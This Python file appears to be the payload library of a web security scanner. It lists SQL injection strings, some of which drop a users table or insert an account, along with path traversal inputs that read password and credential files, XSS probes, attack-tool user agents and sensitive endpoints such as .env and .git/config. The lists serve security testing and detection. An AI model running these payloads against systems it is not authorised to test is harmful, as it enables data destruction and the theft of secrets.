"""
Payload database for security testing
"""

from typing import List, Dict


class PayloadDatabase:
    """Database of security testing payloads"""
    
    def get_sql_injection_payloads(self) -> List[str]:
        """Get SQL injection payloads"""
        return [
            # Basic SQL Injection
            "' OR '1'='1", "' OR 1=1 --", "' OR 'a'='a", "' OR 1=1#",
            "admin'--", "admin'/*", "' OR 1=1 /*", "') OR '1'='1--",
            
            # Union-based SQL Injection
            "' UNION SELECT NULL--", "' UNION SELECT 1,2,3--",
            "' UNION SELECT user(),version(),database()--",
            "' UNION ALL SELECT NULL,NULL,NULL--",
            
            # Time-based Blind SQL Injection
            "'; WAITFOR DELAY '00:00:05'--", "'; SELECT SLEEP(5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            
            # Boolean-based Blind SQL Injection
            "' AND 1=1--", "' AND 1=2--", "' AND SUBSTRING(@@version,1,1)='5'--",
            
            # Error-based SQL Injection
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
            
            # NoSQL Injection
            "'; return true; var x='", "'; return 1==1; var x='",
            "[$ne]", "[$regex]", "[$where]",
            
            # Advanced Payloads
            "'; DROP TABLE users; --", "'; INSERT INTO users VALUES ('hacker','password'); --",
            "' OR (SELECT COUNT(*) FROM users) > 0 --"
        ]
    
    def get_path_traversal_payloads(self) -> List[str]:
        """Get path traversal payloads"""
        return [
            # Basic Path Traversal
            "../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc//passwd", "..%2f..%2f..%2fetc%2fpasswd",
            
            # URL Encoded
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "..%252f..%252f..%252fetc%252fpasswd",
            
            # Double Encoding
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            
            # Unicode Encoding
            "..%u2216..%u2216..%u2216etc%u2216passwd",
            
            # Null Byte Injection
            "../../../etc/passwd%00", "..\\..\\..\\windows\\system32\\config\\sam%00.txt",
            
            # Filter Bypass
            "....\\\\....\\\\....\\\\windows\\\\system32\\\\config\\\\sam",
            "..//////..//////..//////etc//////passwd",
            
            # Common Files
            "../../../proc/self/environ", "../../../proc/version",
            "..\\..\\..\\boot.ini", "..\\..\\..\\windows\\win.ini"
        ]
    
    def get_xss_payloads(self) -> List[str]:
        """Get XSS payloads"""
        return [
            # Basic XSS
            "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>", "<iframe src=javascript:alert('XSS')></iframe>",
            
            # Event Handler XSS
            "<body onload=alert('XSS')>", "<input onfocus=alert('XSS') autofocus>",
            
            # JavaScript Protocol
            "javascript:alert('XSS')", "javascript:confirm('XSS')",
            
            # Filter Bypass
            "<ScRiPt>alert('XSS')</ScRiPt>", "<<SCRIPT>alert('XSS')//<</SCRIPT>",
            
            # Attribute XSS
            "\" onmouseover=\"alert('XSS')\"", "' onmouseover='alert(\"XSS\")'",
            
            # CSS XSS
            "<style>@import'javascript:alert(\"XSS\")';</style>",
            
            # Data URI XSS
            "<iframe src=\"data:text/html,<script>alert('XSS')</script>\"></iframe>",
            
            # Advanced Payloads
            "<svg><script>alert('XSS')</script></svg>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>XSS</marquee>"
        ]
    
    def get_common_endpoints(self) -> List[str]:
        """Get common API endpoints for testing"""
        return [
            # Authentication & User Management
            '/api/auth/login', '/api/auth/register', '/api/auth/logout',
            '/api/users', '/api/users/profile', '/api/users/me',
            '/login', '/register', '/logout', '/signin', '/signup',
            
            # Admin & Management
            '/api/admin', '/api/admin/users', '/admin', '/admin/login',
            
            # API Documentation & Info
            '/api', '/api/v1', '/api/v2', '/docs', '/swagger',
            
            # Configuration & Environment
            '/.env', '/config', '/config.json', '/settings',
            
            # Health & Status
            '/health', '/status', '/ping', '/api/health',
            
            # Development & Debug
            '/debug', '/api/debug', '/test', '/dev',
            
            # Common Web Paths
            '/robots.txt', '/sitemap.xml', '/.htaccess',
            
            # File Operations
            '/api/files', '/api/upload', '/upload', '/files'
        ]
    
    def get_malicious_user_agents(self) -> List[str]:
        """Get malicious user agents for bot detection testing"""
        return [
            # SQL Injection Tools
            "sqlmap/1.0", "sqlmap/1.4.12", "sqlninja/0.2.6-r1",
            
            # Web Vulnerability Scanners
            "nikto/2.1.6", "Nikto/2.1.5", "w3af.org", "OWASP ZAP",
            "Burp Suite Professional", "Acunetix Web Vulnerability Scanner",
            
            # Network Scanners
            "Nmap Scripting Engine", "nmap", "masscan/1.0",
            
            # Penetration Testing Tools
            "Metasploit", "Nessus", "OpenVAS", "Qualys",
            
            # Automated Tools
            "python-requests", "curl/7.68.0", "Wget/1.20.3",
            "libwww-perl", "Go-http-client", "Java/1.8"
        ]

    def get_injectable_endpoints(self):
        """
        Returns list of (endpoint, field_name, [methods]) tuples for injection testing.
        Covers auth, search, profile, and common CRUD endpoints.
        """
        return [
            ("/api/auth/login/", "username", ["GET", "POST"]),
            ("/api/auth/login/", "password", ["POST"]),
            ("/api/auth/register/", "username", ["POST"]),
            ("/api/auth/register/", "email", ["POST"]),
            ("/api/users/", "id", ["GET"]),
            ("/api/users/", "username", ["GET"]),
            ("/api/search/", "q", ["GET"]),
            ("/api/search/", "query", ["GET"]),
            ("/api/products/", "id", ["GET"]),
            ("/api/products/", "category", ["GET"]),
            ("/api/orders/", "id", ["GET"]),
            ("/api/comments/", "post_id", ["GET"]),
            ("/api/files/", "filename", ["GET"]),
            ("/api/download/", "file", ["GET"]),
            ("/login", "username", ["GET", "POST"]),
            ("/login", "password", ["POST"]),
            ("/search", "q", ["GET"]),
        ]

    def get_sensitive_endpoints(self):
        """
        Returns list of endpoint paths that should not be publicly accessible.
        """
        return [
            # Environment & config
            "/.env", "/.env.local", "/.env.production", "/.env.backup",
            "/config.json", "/config.yml", "/config.yaml", "/app.config",
            "/web.config", "/settings.py", "/local_settings.py",
            # Source control
            "/.git/config", "/.git/HEAD", "/.git/COMMIT_EDITMSG",
            "/.svn/entries", "/.hg/hgrc",
            # Backups
            "/backup.sql", "/backup.tar.gz", "/backup.zip", "/db.sql",
            "/dump.sql", "/database.sql", "/site.tar.gz",
            # Admin & debug
            "/admin/", "/admin/login/", "/api/admin/", "/api/debug/",
            "/api/internal/", "/api/private/", "/api/v1/admin/",
            "/phpinfo.php", "/info.php", "/test.php",
            # Framework-specific
            "/actuator/env", "/actuator/health", "/actuator/beans",
            "/actuator/mappings", "/actuator/metrics",
            "/_profiler/", "/_profiler/phpinfo",
            "/telescope/requests", "/horizon/",
            # API docs
            "/docs", "/swagger", "/swagger-ui.html", "/api-docs",
            "/openapi.json", "/openapi.yaml",
            # Logs
            "/logs/", "/log/app.log", "/storage/logs/laravel.log",
            "/var/log/nginx/error.log",
        ]
